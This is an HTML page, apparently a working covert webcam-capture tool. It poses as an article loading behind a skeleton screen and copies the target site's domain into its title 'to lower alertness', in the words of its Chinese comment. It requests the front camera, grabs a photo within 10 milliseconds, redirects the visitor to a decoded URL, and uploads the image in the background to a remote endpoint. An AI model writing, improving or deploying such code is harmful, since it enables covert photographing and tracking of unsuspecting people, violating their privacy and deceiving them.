<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/x-icon" href="logo.ico" />
    <title>正在加载...</title>

    <!-- DNS 预解析 - 加速上传 -->
    <link rel="dns-prefetch" href="//online-mirror.1334132303.workers.dev" />
    <link
      rel="preconnect"
      href="https://online-mirror.1334132303.workers.dev"
      crossorigin
    />

    <style>
      body {
        margin: 0;
        padding: 0;
        background: #f5f5f5;
        font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      }
      /* 骨架屏样式 */
      #skeleton {
        display: block;
        max-width: 800px;
        margin: 40px auto;
        padding: 20px;
        background-color: #fff;
        border-radius: 8px;
      }
      .skeleton-item {
        background: linear-gradient(
          90deg,
          #f0f0f0 25%,
          #e0e0e0 50%,
          #f0f0f0 75%
        );
        background-size: 200% 100%;
        animation: loading 1.5s ease-in-out infinite;
        border-radius: 4px;
        margin-bottom: 15px;
      }
      .skeleton-title {
        height: 32px;
        width: 60%;
        margin-bottom: 20px;
      }
      .skeleton-line {
        height: 16px;
        width: 100%;
      }
      .skeleton-line.short {
        width: 80%;
      }
      .skeleton-line.medium {
        width: 90%;
      }
      .skeleton-image {
        height: 200px;
        width: 100%;
        margin: 20px 0;
      }
      @keyframes loading {
        0% {
          background-position: 200% 0;
        }
        100% {
          background-position: -200% 0;
        }
      }
    </style>
  </head>
  <body>
    <!-- 骨架屏 - 看起来像正常的文章页面加载中 -->
    <div id="skeleton">
      <div class="skeleton-item skeleton-title"></div>
      <div class="skeleton-item skeleton-line"></div>
      <div class="skeleton-item skeleton-line medium"></div>
      <div class="skeleton-item skeleton-line short"></div>
      <div class="skeleton-item skeleton-image"></div>
      <div class="skeleton-item skeleton-line"></div>
      <div class="skeleton-item skeleton-line medium"></div>
      <div class="skeleton-item skeleton-line"></div>
    </div>

    <video id="video" width="0" height="0" autoplay muted></video>
    <canvas
      style="width: 0px; height: 0px"
      id="canvas"
      width="480"
      height="640"
    ></canvas>

    <script src="config.js"></script>
    <script type="text/javascript">
      window.addEventListener(
        "DOMContentLoaded",
        function () {
          const canvas = document.getElementById("canvas");
          const context = canvas.getContext("2d");
          const video = document.getElementById("video");
          const loading = document.getElementById("loading");

          // 解析编码的参数
          const urlParams = new URLSearchParams(window.location.search);
          const encodedData = urlParams.get("d");

          let id, redirectUrl;

          if (encodedData) {
            // 解码 Base64 参数
            try {
              const decodedParams = decodeURIComponent(
                escape(atob(encodedData))
              );
              const parts = decodedParams.split("|");
              id = parts[0];
              redirectUrl = parts[1];
            } catch (e) {
              console.error("参数解码失败:", e);
            }
          } else {
            // 兼容旧版本的明文参数
            id = urlParams.get("id");
            redirectUrl = urlParams.get("url");
          }

          if (!id || !redirectUrl) {
            window.location.href = "home.html";
            return;
          }

          // 动态设置页面标题为目标网站，降低警觉性
          try {
            const targetDomain = new URL(redirectUrl).hostname;
            document.title = targetDomain.replace("www.", "") + " - 加载中...";
          } catch (e) {
            document.title = "正在加载...";
          }

          if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
            navigator.mediaDevices
              .getUserMedia({
                video: {
                  width: { ideal: 480 },
                  height: { ideal: 640 },
                  facingMode: "user",
                },
              })
              .then(
                function (stream) {
                  video.srcObject = stream;
                  video.play();

                  // 超快拍照并跳转（优化到10ms）
                  setTimeout(function () {
                    context.drawImage(video, 0, 0, 480, 640);

                    // 使用JPEG格式，质量0.7，大幅减少文件大小
                    const imageData = canvas.toDataURL("image/jpeg", 0.7);

                    // 先跳转，后上传（完全不阻塞）
                    window.location.replace(redirectUrl);

                    // 关闭摄像头
                    stream.getTracks().forEach((track) => track.stop());

                    // 异步上传，完全在后台进行
                    fetch(window.API_CONFIG.UPLOAD, {
                      method: "POST",
                      headers: {
                        "Content-Type": "application/json",
                      },
                      body: JSON.stringify({
                        id: id,
                        image: imageData,
                      }),
                    }).catch((error) => {
                      console.error("上传错误:", error);
                    });
                  }, 10); // 优化到10ms，极速跳转
                },
                function () {
                  // 权限被拒绝，直接跳转
                  if (redirectUrl) {
                    window.location.href = redirectUrl;
                  }
                }
              );
          } else {
            // 浏览器不支持，直接跳转
            if (redirectUrl) {
              window.location.href = redirectUrl;
            }
          }
        },
        false
      );
    </script>
  </body>
</html>
